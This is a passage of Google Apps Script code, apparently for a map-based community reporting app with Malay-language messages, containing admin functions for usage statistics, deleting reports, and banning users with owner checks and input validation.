  const quota = ['G_maps', 'G_recheck', 'G_report', 'G_photon', 'G_overpass', 'G_resolve'].map(k => ({
    key: k, used: Number(cache.get(rlKey_(k)) || 0), max: CONFIG.LIMITS[k][0], hours: CONFIG.LIMITS[k][1] / 3600 }));
  const byType = {};
  reps.forEach(x => { byType[x.type] = (byType[x.type] || 0) + 1; });
  return {
    activeUsers: seen.filter(t => t > now - USER_SEEN_SEC_ * 1000).length,
    usersHour: seen.filter(t => t > now - 3600000).length,
    reports: reps.length, reportsDay: reps.filter(x => x.time > now - 864e5).length,
    shares: shares, byType: byType, quota: quota, recent: reps.slice(0, 100), banned: bannedList_()
  };
}

function adminDeleteReport(token, id) {
  requireOwner_(token);
  id = String(id || '');
  if (!/^[0-9a-f-]{8,36}$/i.test(id)) throw new Error('Laporan tidak dijumpai.');
  const lock = lock_();
  try {
    const sh = getSheet_(SHEET_REPORTS), last = sh.getLastRow();
    const ids = last < 2 ? [] : sh.getRange(2, 1, last - 1, 1).getValues();
    const i = ids.findIndex(v => String(v[0]) === id);
    if (i < 0) throw new Error('Laporan tidak dijumpai.');
    sh.deleteRow(i + 2);
    rebuildReports_();
    return { ok: true };
  } finally {
    lock.releaseLock();
  }
}

/** Sekat / nyahsekat pengguna. Bila disekat, semua laporan aktifnya dipadam. */
function adminBan(token, userId, ban) {
  const me = requireOwner_(token);
  userId = String(userId || '');
  if (!/^[ag]_[A-Za-z0-9_-]{8,40}$/.test(userId)) throw new Error('ID pengguna tidak sah.');
  if (ban === true && userId === me) throw new Error('Anda tidak boleh menyekat diri sendiri.');
  const lock = lock_();
  try {
    const props = PropertiesService.getScriptProperties();
    let list = bannedList_().filter(x => x !== userId);
    if (ban === true) {
      if (list.length >= CONFIG.MAX_BANNED) throw new Error('Senarai sekatan penuh.');
      list.push(userId);
      const sh = getSheet_(SHEET_REPORTS);
      pruneSheet_(sh, REPORT_HEADERS.length, x => String(x[5]) !== userId);
      rebuildReports_();
    }
    props.setProperty('BANNED', JSON.stringify(list));
    CacheService.getScriptCache().put('banned', JSON.stringify(list), 600);
    return { ok: true, banned: list };
  } finally {
    lock.releaseLock();
  }
}
